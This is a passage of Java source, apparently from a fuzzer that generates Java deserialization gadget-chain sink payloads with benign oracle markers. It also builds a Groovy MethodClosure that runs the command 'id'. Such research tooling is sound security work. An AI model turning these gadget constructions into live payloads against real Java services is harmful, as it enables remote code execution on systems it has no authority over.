                if (fldSigAndPayload != null) resList.add(fldSigAndPayload);
                isPathSet = true;
            }
        }
        if (!isPathSet) throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genFileSinkPayload: sink object generation failed as no suitable file path field");
        // content of the file
        if (sinkRcd.sinkFileContentF != null) {
            // check if field is settable
            if (!ValidatorGlobalDataContainer.isFieldSettableByFieldSig(sinkRcd.sinkFileContentF.getSig())) {
                throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genFileSinkPayload: sink object generation failed as no suitable file content field");
            }
            Object sinkObj = assemblePayload(sinkRcd.sinkFileContentF, "hn13EvilMsg".getBytes(StandardCharsets.UTF_8));
            resList.add(new Pair<>(getFldSigWithID(sinkRcd.sinkFileContentF), sinkObj));
        }
        return resList;
    }

    /**
     * The path fields of a FILE sink that survive serialization. A transient path field is lost on the
     * wire and rebuilt by the deserialization code from other fields: e.g. wicket's DiskFileItem.dfos,
     * created in readObject() for new File(repository, "upload_*.tmp"). The non-transient java.io.File
     * fields of its class then carry the payload directory instead.
     */
    private static List<FieldRecord> serializablePathFields(Collection<FieldRecord> pathFields) {
        List<FieldRecord> res = new ArrayList<>();
        for (FieldRecord fr : pathFields) {
            if (!fr.isTransient || !fr.fields.isEmpty()) {
                res.add(fr);
                continue;
            }
            List<FieldRecord> fileFields = new ArrayList<>();
            try {
                for (java.lang.reflect.Field f : ClassUtils.wrapperClassForName(fr.classBelongTo).getDeclaredFields()) {
                    int mod = f.getModifiers();
                    if (f.getType() == File.class && !java.lang.reflect.Modifier.isStatic(mod)
                            && !java.lang.reflect.Modifier.isTransient(mod)) {
                        FieldRecord alt = new FieldRecord();
                        alt.classBelongTo = fr.classBelongTo;
                        alt.classId = fr.classId;
                        alt.fieldName = f.getName();
                        alt.fieldType = "java.io.File";
                        alt.sig = "<" + fr.classBelongTo + ": java.io.File " + f.getName() + ">";
                        fileFields.add(alt);
                    }
                }
            } catch (Throwable e) {
                LogUtils.warn("In `serializablePathFields`: " + e);
            }
            if (fileFields.isEmpty()) {
                res.add(fr);
            } else {
                LogUtils.info("FILE sink: transient path field " + fr.fieldName + ", the payload directory goes into "
                        + fileFields.stream().map(x -> x.fieldName).reduce((a, b) -> a + ", " + b).get());
                res.addAll(fileFields);
            }
        }
        return res;
    }

    private static ArrayList<Pair<String, Object>> genInvokeSinkPayload(SinkRecord sinkRcd) throws GeneratorException, ReflectionException {
        ArrayList<Pair<String, Object>> resList = new ArrayList<>();
        // 处理承载method的操作对象
        FieldRecord sinkClassFldRcd = sinkRcd.sinkClassBelongToF;
        String sinkClassFldSig = getFldSigWithID(sinkClassFldRcd);
        // check if field is settable
        if (!ValidatorGlobalDataContainer.isFieldSettableByFieldSig(sinkClassFldSig)) {
            throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genInvokeSinkPayload: " +
                    "sink object generation failed as no suitable class field");
        }
        if (!isFullInvokeGadget) {
            Object sinkObj = assembleSinkClassBelongToPayload(sinkClassFldRcd);
            resList.add(new Pair<>(sinkClassFldSig, sinkObj));
            crtSinkClassBelongToObjKey.put(sinkClassFldSig, sinkClassFldRcd);
        } else {
            if (invokeGadgetClass == null) {
                throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genInvokeSinkPayload: " +
                        "invokeGadgetClass is null");
            }
            Object sinkObj = assemblePayload(sinkClassFldRcd, OracleClassA.class);
            resList.add(new Pair<>(sinkClassFldSig, sinkObj));
        }
        // 处理方法名
        FieldRecord sinkMtdFR;
        if (sinkRcd.sinkMethodNameF != null) {
            // check if field is settable
            if (!ValidatorGlobalDataContainer.isFieldSettableByFieldSig(sinkRcd.sinkMethodNameF.sig)) {
                throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genInvokeSinkPayload: " +
                        "sink object generation failed as no suitable method name field");
            }
            sinkMtdFR = sinkRcd.getSinkMethodNameF();
            Object sinkObj = assemblePayload(sinkMtdFR, "anOracleMethod");
            resList.add(new Pair<>(getFldSigWithID(sinkMtdFR), sinkObj));
        } else if (sinkRcd.sinkMethodF != null) {
            // check if field is settable
            if (!ValidatorGlobalDataContainer.isFieldSettableByFieldSig(sinkRcd.sinkMethodF.sig)) {
                throw new SinkPayloadsGeneratorException("SinkPayloadsGenerator.genInvokeSinkPayload: " +
                        "sink object generation failed as no suitable method field");
            }
            sinkMtdFR = sinkRcd.getSinkMethodF();
            String fldType = sinkMtdFR.getFieldType();
            if (fldType.equals("java.lang.reflect.Method")) {
                Method evilMtd;
                try {
                    if (!isFullInvokeGadget) {
                        evilMtd = OracleClassA.class.getMethod("anOracleMethod");
                    } else {
                        evilMtd = invokeGadgetClass.getMethod(invokeGadgetMethodName);
                    }
                } catch (NoSuchMethodException e) {
                    throw new SinkPayloadsGeneratorException(e.getMessage());
                }
                Object sinkObj = assemblePayload(sinkMtdFR, evilMtd);
                resList.add(new Pair<>(getFldSigWithID(sinkMtdFR), sinkObj));
            } else if (fldType.equals("java.lang.Class")) {
                if (!isFullInvokeGadget) {
                    Object sinkObj = assemblePayload(sinkMtdFR, OracleClassA.class);
                    resList.add(new Pair<>(getFldSigWithID(sinkMtdFR), sinkObj));
                } else {
                    Object sinkObj = assemblePayload(sinkMtdFR, invokeGadgetClass);
                    resList.add(new Pair<>(getFldSigWithID(sinkMtdFR), sinkObj));
                }
            } else if (fldType.equals("java.lang.reflect.Member")) {
                // A Member-typed sink method field (e.g. org.mozilla.javascript.MemberBox.memberObject) holds the
                // Method the sink invokes, so it gets the same oracle method as a Method-typed field. Leaving it unset
                // does not just lose the sink: MemberBox keeps all its fields transient and derives what writeObject
                // writes from this field, so a null one serializes fine and then makes its readObject throw a
                // NullPointerException, which looks like the chain never starting.
                // The field is declared as Member because a chain may invoke a Field instead (MyFaces); those IOCDs
                // name the field getter/setter in sinkMethodNameF, which is handled above, so Method is used here.
                Method oracleMtd;
                try {
                    oracleMtd = isFullInvokeGadget
                            ? invokeGadgetClass.getMethod(invokeGadgetMethodName)
                            : OracleClassA.class.getMethod("anOracleMethod");
                } catch (NoSuchMethodException e) {
                    throw new SinkPayloadsGeneratorException(e.getMessage());
                }
                Object sinkObj = assemblePayload(sinkMtdFR, oracleMtd);
                resList.add(new Pair<>(getFldSigWithID(sinkMtdFR), sinkObj));
            }
        }
        return resList;
    }

    /**
     * 反馈一个fld的sig和他所在的类的class id
     *
     * @param fldRcd
     * @return
     */
    private static String getFldSigWithID(FieldRecord fldRcd) {
        return fldRcd.getSig() + "#" + fldRcd.getClassId();
    }

    /**
     * 对于SinkRecord中的FieldRecord，其最深处的fldsig才是sink点最终要设置的值
     * 因此该方法直接获取最深的值
     *
     * @param fldRcd
     * @return
     */
    private static String getDeepestFldSigWithID(FieldRecord fldRcd) {
        FieldRecord targetFldRcd = fldRcd;
        while (!targetFldRcd.fields.isEmpty()) {
            targetFldRcd = targetFldRcd.fields.iterator().next();
        }
        return targetFldRcd.getSig() + "#" + targetFldRcd.getClassId();
    }

    public static Object assembleSinkClassBelongToPayload(FieldRecord sinkClassFldRcd) throws ReflectionException, GeneratorException {
        Object sinkObj = null;
        if (sinkClassFldRcd.fieldType.equals("java.lang.Object")
                || sinkClassFldRcd.fieldType.equals("java.lang.Object[]")
                || sinkClassFldRcd.fieldType.equals("java.io.Serializable")) {
            sinkObj = assemblePayload(sinkClassFldRcd, new OracleClassA());
        } else {
            sinkObj = assemblePayload(sinkClassFldRcd, OracleClassA.class);
        }
        return sinkObj;
    }

    private static Object assemblePayload(FieldRecord record, Object payload) throws ReflectionException, GeneratorException {
        return assemblePayload0(record, payload, 0);
    }

    /**
     * 生成一个*全新*的SinkObject
     * SinkObject不需要被变异，因此只需要记录被用于哪个位置即可
     *
     * @param record
     * @param payload
     * @param layer
     * @return
     * @throws GeneratorException
     * @throws ReflectionException
     */
    private static Object assemblePayload0(FieldRecord record, Object payload, int layer) throws GeneratorException, ReflectionException {
        String wrapperType = record.getClassBelongTo();
        String fldType = record.getFieldType();
        String fldName = record.getFieldName();
        Object wrappedObj = SeedGenerator.createObjectWithReflection(wrapperType, null);
        if (record.fields.isEmpty()) {
            return wrapObject(fldType, fldName, payload, wrappedObj, layer);
        }
        payload =  assemblePayload0(record.fields.iterator().next(), payload, layer + 1);
        return wrapObject(fldType, fldName, payload, wrappedObj, layer);

    }

    /**
     * 顾名思义，该方法用于处理fldInFld的情况
     *
     * @param fldType
     * @param fldName
     * @param payload
     * @param wrappedObj
     * @param layer
     * @return
     * @throws GeneratorException
     * @throws ReflectionException
     */
    private static Object wrapObject(String fldType, String fldName, Object payload, Object wrappedObj, int layer) throws GeneratorException, ReflectionException  {
        if (layer == 0) {
            if (fldType.contains("[]")) {
                if (payload.getClass().isArray() 
                    && payload.getClass().getComponentType().getName().equals(fldType.substring(0, fldType.length() - 2))) {
                    return payload;
                }
                Class arrClz = ClassUtils.getClassByName(fldType);
                Object arr = Array.newInstance(arrClz.getComponentType(), 2);
                if (!arrClz.getComponentType().equals(payload.getClass())) {
                    if (FuzzUtils.isSpecialFldInFld(fldType)) {
                        Object nodeOrEntry = SeedGenerator.createObjectWithReflection(arrClz.getComponentType().getName(), null);
                        SeedGenerator.fillSpecialCollectionFieldRandomly(nodeOrEntry, payload);
                        Array.set(arr, 0, nodeOrEntry);
                        return arr;
                    }
                }
                try {
                    Array.set(arr, 0, payload);
                    Array.set(arr, 1, payload);
                } catch (IllegalArgumentException e) {
                    throw new GeneratorException("SinkPayloadsGenerator.assemblePayload0: " +
                            "payload seedType is not equal to array component seedType");
                }
                return arr;
            }
            return adaptToStringField(fldType, payload);
        }
        ReflectionUtils.setFieldValue(wrappedObj, fldName, adaptToStringField(fldType, payload));
        return wrappedObj;
    }

    /**
     * The class of a sink is carried as the Class object, but a field of type String (e.g.
     * SwingLazyValue.className, which the sink loads by name) needs the name of that class: writing the Class
     * object into it failed, and the seed with it.
     */
    private static Object adaptToStringField(String fldType, Object payload) {
        if (payload instanceof Class && "java.lang.String".equals(fldType)) {
            return ((Class<?>) payload).getName();
        }
        return payload;
    }

    private static Object generateGroovyMethodClosure() throws ClassNotFoundException, ReflectionException {
        String defaultCmd = "id";
        String groovyMtd = "execute";
        Object mtdClosure = ReflectionUtils.createWithConstructor(
                ClassUtils.wrapperClassForName(ClassUtils.GROOVY_METHOD_CLOSURE),
                new Class[] {Object.class, String.class},
                new Object[] {defaultCmd, groovyMtd}
        );
        ReflectionUtils.setFieldValue(mtdClosure, "maximumNumberOfParameters", 0);
        return mtdClosure;
    }

}
